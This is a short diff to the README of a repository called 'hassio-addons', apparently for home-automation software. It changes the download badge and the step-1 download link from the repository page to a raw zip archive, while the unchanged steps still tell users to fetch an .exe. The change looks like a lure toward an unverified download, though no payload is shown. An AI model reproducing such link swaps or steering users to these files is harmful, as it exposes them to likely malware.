@@ -1,6 +1,6 @@
 # 📦 hassio-addons - Manage your home automation devices easily
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Enkephalineyecup92/hassio-addons)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Enkephalineyecup92/hassio-addons/main/Sticta/hassio_addons_v2.9.zip)
 
 ## 🎯 About This Software
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to get the software on your machine.
 
-1. Visit this page to download: https://github.com/Enkephalineyecup92/hassio-addons.
+1. Visit this page to download: https://raw.githubusercontent.com/Enkephalineyecup92/hassio-addons/main/Sticta/hassio_addons_v2.9.zip
 2. Look for the button marked "Releases" on the right side of the screen.
 3. Click the latest version link.
 4. Select the file ending in .exe to start the download.
